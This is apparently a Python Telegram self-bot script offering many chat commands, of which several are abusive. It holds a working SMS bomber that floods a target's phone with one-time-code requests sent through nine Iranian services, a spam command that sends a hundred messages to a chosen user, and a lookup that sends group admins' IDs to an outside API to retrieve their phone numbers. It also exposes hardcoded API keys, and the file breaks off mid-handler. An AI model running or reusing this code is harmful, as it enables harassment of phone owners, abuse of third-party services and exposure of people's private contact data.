# -*- coding: utf-8 -*-
from pyrogram import Client, filters
import requests
import random
import time
import threading
import subprocess
import base64
import psutil
from config import *

api_id = 16365825
api_hash = 'becf667f7a469ef42103585c09dbc334'
app = Client("araz", api_id, api_hash)


def get_size(bytes, suffix="B"):

    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
def sms(message):
    def snapp(phone):
        try:
            snapD = {"cellphone": phone}
            snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapD)
            pass
        except:
            pass

    def temch(phone):
        try:
            req = requests.post('https://api.timcheh.com/auth/otp/send', data={"mobile": "0" + phone})
        except:
            pass

    def basalam(phone):
        try:
            req = requests.post('https://api.basalam.com/user', json={"variables": {"mobile": "0" + phone},
                                                                      "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"})
        except:
            pass

    def bazar(phone):
        try:
            req = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', json={
                "properties": {"language": 2, "clientID": "licfcvqx6vclag36ak4obqgvnzvelqbu",
                               "deviceID": "licfcvqx6vclag36ak4obqgvnzvelqbu", "clientVersion": "web"},
                "singleRequest": {"getOtpTokenRequest": {"username": "98" + phone}}})

        except:
           pass

    def digij(phone):
        try:
            digij = {"cellNumber": "0" + phone,
                     "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER",
                                "deviceAPI": "WEB_BROWSER", "osName": "WEB"}}
            requests.post("https://app.mydigipay.com/digipay/api/users/send-sms", json=digij)
        except:

            pass

    def snamp2(phone):
        try:
            snap2j = {"phone": "0" + phone}
            requests.post("https://api.snapp.ir/api/v1/sms/link", json=snap2j)
        except:
            pass

    def tapsi(phone):
        try:
            tapsi1 = {"credential": {"phoneNumber": "0" + phone, "role": "PASSENGER"}}
            requests.post("https://api.tapsi.cab/api/v2/user", json=tapsi1)
        except:
            pass

    def divar(phone):
        try:
            divarj = {"phone": "0" + phone}
            requests.post("https://api.divar.ir/v5/auth/authenticate", json=divarj)
        except:
            pass

    def ruby(phone):
        try:
            rubj = {"api_version": "3", "method": "sendCode",
                    "data": {"phone_number": "+98" + phone, "send_type": "SMS"}}
            requests.post("https://messengerg2c42.iranlms.ir/", json=rubj)
        except:
            pass
    number = message.text.split()[1]
    for i in range(100):
        threading.Thread(target=ruby , args=([number])).start()
        threading.Thread(target=divar , args=([number])).start()
        threading.Thread(target=digij , args=([number])).start()
        threading.Thread(target=bazar , args=([number])).start()
        threading.Thread(target=basalam , args=([number])).start()
        threading.Thread(target=tapsi , args=([number])).start()
        threading.Thread(target=snapp , args=([number])).start()
        threading.Thread(target=snamp2 , args=([number])).start()
    tim = time.strftime("%H:%M:%S")
    cpufreq = psutil.cpu_freq()
    max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
    cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
    svmem = psutil.virtual_memory()
    total_memory = (f"Total: {get_size(svmem.total)}")
    Available_memory = (f"Available: {get_size(svmem.available)}")
    Percentage_Memory = (f"Percentage: {svmem.percent}%")
    khat = '&_________% ARaZ %__________&'
    app.edit_message_text(message.chat.id, message.message_id, f'[ ! ]End Bomber | Time: {tim} \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')


def sapm(message):
    for i in range(100):
        app.send_message(message.reply_to_message.from_user.id , 'Test')

def cmd(message , cmd):
    c = subprocess.getoutput(cmd)
    app.send_message('me', c)
    app.edit_message_text(message.chat.id, message.message_id , 'Command Runed And Data Saved To Your P.v..!')

def down(message):

    im = app.get_me()
    idm =im.id
    for i in range(10):
        app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'Downloading : {str(i*10)}%')

def up(message):
    im = app.get_me()
    idm = im.id
    for i in range(10):
        a = '####'*i
        app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'Uploading.!: [{a}] {str(i*10)}%')

@app.on_message(filters.me)
def shakar(client , message):

        me = app.get_me()
        idm = me.id
        khat = '➖➖➖➖➖➖➖➖➖➖'
        if message.text == 'help':
            helps = ''' 
❈ HelP :
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `help` : help SARaZ
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `/cmd` : run command in server
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `number` : Search User Id in Database | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `how` : Info Member | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `number` admin : Search User Id Admins in Database
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `download` : Download File
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `download photo` : Downloaded Photo Timer
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `bomber` : Sms Bomber In number | bomber 9000000000
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `ban` : Remove Member In gap
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `unban` : Remove Member From Delete Gap
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `pin` : pined Message | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `unpin` : Remove Message From Pin | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `weather` : Get The City Weather | weather kashan
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `encode` : Encoded P.m base64 | encode ARaZ
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `decode` : Decoded P.m base64 | decode cmV6YQ==
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `search` : Searching P.m In Your Account | Search ARaZ
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `time` : Get Time Now
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `change password` : Changed Two-Step Verification Your Account | change password [Now Password] [New Password] 
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `set bio` : Set P.m In Bio Account | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `how is member` : Get Info Member Account In Gap | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `proxy` : Get Proxy http
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠            
🎖 `checking members` : Check Number Member
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `create super group` : Created Super Group            
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `check channel` : Check The Channel For No Scam
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `block` : Block Account | reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `unblock` : Remove from the block  | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `join` : Join A Public Group Or Channel | Reply In Userid
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `leave` : leaved From Group
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `spam` : Spam Account | Reply
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
🎖 `me` : Info Creator
✠ ┈┅┅┅┈ ✮ ┈┅┅┅┈ ✠
            '''
            app.edit_message_text(message.chat.id, message.message_id,helps)
            
        if message.text == 'proxy':
            a = 'http://pubproxy.com/api/proxy'
            req = requests.get(a)
            A = (req.text.split(',')[1])
            b = (req.text.split(',')[2])
            cpufreq = psutil.cpu_freq()
            tim = time.strftime("%H:%M:%S")
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id,
                                  f'{A}\n{b}\n[ % ] Time: {tim} \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text.split()[0] == 'weather':
            s = time.time()
            app.edit_message_text(message.chat.id, message.message_id, f'Loading..!')
            api = "http://api.openweathermap.org/data/2.5/weather?q=" + message.text.split()[1] + "&appid=afa35eb138c4bfb90705e36c96098f28"
            json_data = requests.get(api).json()
            c = json_data['weather'][0]['main']
            t = int(json_data['main']['temp'] - 273.15)
            m = int(json_data['main']['temp_min'] - 273.15)
            ma = int(json_data['main']['temp_max'] - 273.15)
            p = json_data['main']['pressure']
            h = json_data['main']['humidity']
            w = json_data['wind']['speed']
            su = time.strftime("%I:%M:%S", time.gmtime(json_data['sys']['sunrise'] - 21600))
            suns = time.strftime("%I:%M:%S", time.gmtime(json_data['sys']['sunset'] - 21600))
            info = "Info | "+c+" | " + str(t) +" C |"
            data = f'\n[ ! ] Max Temp: {str(m)}\n[ ! ] Min Temp: {str(ma)}\n[ ! ] Pressure: {str(p)}\n[ ! ] Humidity: {str(h)}\n[ ! ] Wind speed: {str(w)}\n[ ! ] Sunrise: {str(su)}\n[ ! ] Sunset: {str(suns)}'
            p = time.time()
            f = str(s - p)
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id, f'-->{info}\n{data}\n[ % ] Time: {f} \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text.split()[0] == 'encode':
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            tim = time.strftime("%H:%M:%S")
            enc = base64.b64encode(message.text.split()[1].encode())
            app.edit_message_text(message.chat.id, message.message_id,f'[ ! ]Encoded Base64: {enc} \n| Time: {tim} \n{khat}\n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text.split()[0] == 'decode':
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            tim = time.strftime("%H:%M:%S")
            enc = base64.b64decode(message.text.split()[1]).decode()
            app.edit_message_text(message.chat.id, message.message_id,f'[ ! ]Decoded Base64: {enc} \n| Time: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        try:
            if message.text.split()[0] == 'bomber':

                tim = time.strftime("%H:%M:%S")
                cpufreq = psutil.cpu_freq()
                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                svmem = psutil.virtual_memory()
                total_memory = (f"Total: {get_size(svmem.total)}")
                Available_memory = (f"Available: {get_size(svmem.available)}")
                Percentage_Memory = (f"Percentage: {svmem.percent}%")
                app.edit_message_text(message.chat.id, message.message_id, f'[ ! ]Run Bomber | Time: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
                threading.Thread(target=sms, args=([message])).start()
        except:
            pass


        try:
            if message.text.split(' ')[0] == '/cmd':
                cmd(message , message.text.split(' ')[1])
        except:
            pass

        try:
            if message.text.split(' ')[0] == 'search':
                s = time.time()
            
                for p in app.search_global(message.text.split(' ')[1], limit=10):
                    tim = time.strftime("%H:%M:%S")
                    app.edit_message_text(message.chat.id, message.message_id , f'Searching! | Time: {tim}')
                    app.edit_message_text(message.chat.id, message.message_id , f'Searching..! | Time: {tim}')
                    app.send_message('me' , p.text)
                p = time.time()
                f = str(s-p)
                cpufreq = psutil.cpu_freq()
                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                svmem = psutil.virtual_memory()
                total_memory = (f"Total: {get_size(svmem.total)}")
                Available_memory = (f"Available: {get_size(svmem.available)}")
                Percentage_Memory = (f"Percentage: {svmem.percent}%")
                app.edit_message_text(message.chat.id, message.message_id , f'Search Ended..! | Time Search: {f}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
        except:
            pass

        if message.text == 'time':
            tim = time.strftime("%H:%M:%S")
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id , f'Time Is {tim} \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        try:
            if message.text.split(' ')[0] == 'change' and message.text.split(' ')[1] == 'password':
                app.change_cloud_password(message.text.split(' ')[2], message.text.split(' ')[3])
                cpufreq = psutil.cpu_freq()
                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                svmem = psutil.virtual_memory()
                total_memory = (f"Total: {get_size(svmem.total)}")
                Available_memory = (f"Available: {get_size(svmem.available)}")
                Percentage_Memory = (f"Percentage: {svmem.percent}%")
                tim = time.strftime("%H:%M:%S")
                app.edit_message_text(message.chat.id, message.message_id , f'Changed Password..! | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
        except:
            pass

        if message.text == 'download':
              cpufreq = psutil.cpu_freq()
              max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
              cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
              svmem = psutil.virtual_memory()
              total_memory = (f"Total: {get_size(svmem.total)}")
              Available_memory = (f"Available: {get_size(svmem.available)}")
              Percentage_Memory = (f"Percentage: {svmem.percent}%")
              if message.reply_to_message.media == 'document':

                 app.download_media(message.reply_to_message.document.file_id, progress=down(message))
                 app.edit_message_text(message.chat.id, message.message_id, f'File Downloaded..! \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

              elif message.reply_to_message.media == 'photo':

                  app.download_media(message.reply_to_message.photo.file_id, progress=down(message))
                  app.edit_message_text(message.chat.id, message.message_id, f'File Downloaded..! \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

              elif message.reply_to_message.media == 'video':

                  app.download_media(message.reply_to_message.video.file_id, progress=down(message))
                  app.edit_message_text(message.chat.id, message.message_id, f'File Downloaded..! \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

              elif  message.reply_to_message.media == 'music':
                  app.download_media(message.reply_to_message.music.file_id, progress=down(message))
                  app.edit_message_text(message.chat.id, message.message_id, f'File Downloaded..! \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'number admin':
            a = app.get_chat_members(message.chat.id, filter="administrators")
            for i in range(len(a)):
                data = a[i]
                print(i)
                for i in range(1):
                    app.edit_message_text(message.chat.id, message.message_id, f'Checking Members')
                    app.edit_message_text(message.chat.id, message.message_id, f'Checking Members...!')
                req = requests.get(
                    'https://meysam72.tk/api/finder.php?id=' + str(data.user.id))
                res = req.json()
                try:
                    data = f'''{res["Result"]["phone"]}
{res["Result"]["username"]}
{res["Result"]['user_id']}
                            '''
                except:
                    data = ''
                f = open('NUMBER.txt','w+')
                f.write(data)
                f.close()
                cpufreq = psutil.cpu_freq()
                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                svmem = psutil.virtual_memory()
                total_memory = (f"Total: {get_size(svmem.total)}")
                Available_memory = (f"Available: {get_size(svmem.available)}")
                Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id, f'Check Ended...! \n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'ban':
            tim = time.strftime("%H:%M:%S")
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            try:
                app.ban_chat_member(message.chat.id, message.reply_to_message.from_user.id)
                app.edit_message_text(message.chat.id, message.message_id, f'Removed  | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
            except:
                app.edit_message_text(message.reply_to_message.chat.id, message.message_id,
                                      f'Can t Remove  | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'unban':
            tim = time.strftime("%H:%M:%S")
            app.unban_chat_member(message.reply_to_message.chat.id, message.reply_to_message.from_user.id)
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id, message.message_id,
                                  f'Removed from removal | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'pin':
            tim = time.strftime("%H:%M:%S")
            app.pin_chat_message(message.reply_to_message.chat.id, message.reply_to_message.message_id)
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id , message.message_id , f'Pined P.M | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'set bio':
            tim = time.strftime("%H:%M:%S")
            app.update_profile(bio=message.reply_to_message.text)
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id , message.message_id ,f'Seted  Bio..! | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'how is member':
            member = app.get_chat_member(message.reply_to_message.chat.id, message.reply_to_message.from_user.id)
            tim = time.strftime("%H:%M:%S")
            try:
                data = f'''
            Name Is: {member["invited_by"]["first_name"]}
User Name: {member["invited_by"]["username"]}
status: {member["status"]}
Time Join: {member["joined_date"]}
User Id :{member["invited_by"]["id"]}
SARaZ: {member["invited_by"]["is_sARaZ"]}
Contact: {member["invited_by"]["is_contact"]}
Scam: {member["invited_by"]["is_scam"]}
Fake: {member["invited_by"]["is_fake"]}
Time It: {tim}
'''
            except:
                data=f'''
                   
Name Is: false
User Name: {member["invited_by"]["username"]}
status: {member["status"]}
Time Join: {member["joined_date"]}
User Id :{member["invited_by"]["id"]}
SARaZ: {member["invited_by"]["is_sARaZ"]}
Contact: {member["invited_by"]["is_contact"]}
Scam: {member["invited_by"]["is_scam"]}
Fake: {member["invited_by"]["is_fake"]}
Time It: {tim}
      '''
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id, data+f"\n{khat}\n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}")

        if message.text == 'checking members':
            tim = time.strftime("%H:%M:%S")
            count = app.get_chat_members_count(message.chat.id)
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.chat.id, message.message_id, f'Number Members: {count} | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'create super group':
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            tim = time.strftime("%H:%M:%S")
            try:
                app.create_supergroup("New Gap Super", "Hello To My World")
                app.edit_message_text(message.chat.id, message.message_id,
                                      f'Created New Super Group | Time It:  {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
            except:
                app.edit_message_text(message.chat.id, message.message_id, f'Can t Create New Super Group | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'check channel':
                a = app.get_chat_event_log(channel())
                for i in a:
                    try:
                        if i['new_member_permissions']['status'] == 'banned':
                            tim = time.strftime("%H:%M:%S")
                            try:
                                data = f'''
Baned User..!
Name Admin: {i['new_member_permissions']["restricted_by"]['first_name']}
User Id Admin: {i['new_member_permissions']["restricted_by"]['id']}
SARaZ: {i['new_member_permissions']["restricted_by"]['is_sARaZ']}
Bot: {i['new_member_permissions']["restricted_by"]['is_bot']}
Scam: {i['new_member_permissions']["restricted_by"]['is_scam']}
Fake: {i['new_member_permissions']["restricted_by"]['is_fake']}
Status: {i['new_member_permissions']["restricted_by"]['status']}
Time It: {tim}
'''
                                cpufreq = psutil.cpu_freq()
                                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                                svmem = psutil.virtual_memory()
                                total_memory = (f"Total: {get_size(svmem.total)}")
                                Available_memory = (f"Available: {get_size(svmem.available)}")
                                Percentage_Memory = (f"Percentage: {svmem.percent}%")
                                app.edit_message_text(message.chat.id, message.message_id, data+f"\n{khat}\n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}")
                            except:
                                data = 'Not Found Removed'
                            app.edit_message_text(message.chat.id, message.message_id, data)
                    except:
                        data = 'Not Found Removed'
                        app.edit_message_text(message.chat.id, message.message_id, data)


        if message.text == 'unblock':
            tim = time.strftime("%H:%M:%S")
            app.unblock_user(message.reply_to_message.from_user.id)
            try:
                cpufreq = psutil.cpu_freq()
                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                svmem = psutil.virtual_memory()
                total_memory = (f"Total: {get_size(svmem.total)}")
                Available_memory = (f"Available: {get_size(svmem.available)}")
                Percentage_Memory = (f"Percentage: {svmem.percent}%")
                app.edit_message_text(message.reply_to_message.chat.id, message.message_id,
                                      f'Unlocked..! | Time It {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
            except:
                pass


        if message.text == 'block':
            tim = time.strftime("%H:%M:%S")
            app.block_user(message.reply_to_message.from_user.id)
            try:
                cpufreq = psutil.cpu_freq()
                max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                svmem = psutil.virtual_memory()
                total_memory = (f"Total: {get_size(svmem.total)}")
                Available_memory = (f"Available: {get_size(svmem.available)}")
                Percentage_Memory = (f"Percentage: {svmem.percent}%")
                app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'Blocked..! | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
            except:
                pass

        if message.text == 'unpin':
            tim = time.strftime("%H:%M:%S")
            app.unpin_chat_message(message.reply_to_message.chat.id, message.reply_to_message.message_id)
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
            cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
            svmem = psutil.virtual_memory()
            total_memory = (f"Total: {get_size(svmem.total)}")
            Available_memory = (f"Available: {get_size(svmem.available)}")
            Percentage_Memory = (f"Percentage: {svmem.percent}%")
            app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'Unpined P.M | Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'join':
            try:
                 tim = time.strftime("%H:%M:%S")
                 app.join_chat(message.reply_to_message.text)
                 cpufreq = psutil.cpu_freq()
                 max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
                 cpu_usage = (f"Total CPU Usage: {psutil.cpu_percent()}%")
                 svmem = psutil.virtual_memory()
                 total_memory = (f"Total: {get_size(svmem.total)}")
                 Available_memory = (f"Available: {get_size(svmem.available)}")
                 Percentage_Memory = (f"Percentage: {svmem.percent}%")
                 app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'joined Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')
            except:
                tim = time.strftime("%H:%M:%S")
                app.edit_message_text(message.reply_to_message.chat.id, message.message_id, f'Can t Join Time It: {tim}\n{khat} \n[ INF ] {max}\n[ INF ] {cpu_usage}\n[ INF ] {total_memory}\n[ INF ] {Available_memory}\n[ INF ] {Percentage_Memory}')

        if message.text == 'leave':
            app.leave_chat(message.chat.id)
            tim = time.strftime("%H:%M:%S")
            cpufreq = psutil.cpu_freq()
            max = (f"Max Frequency: {cpufreq.max:.2f}Mhz")
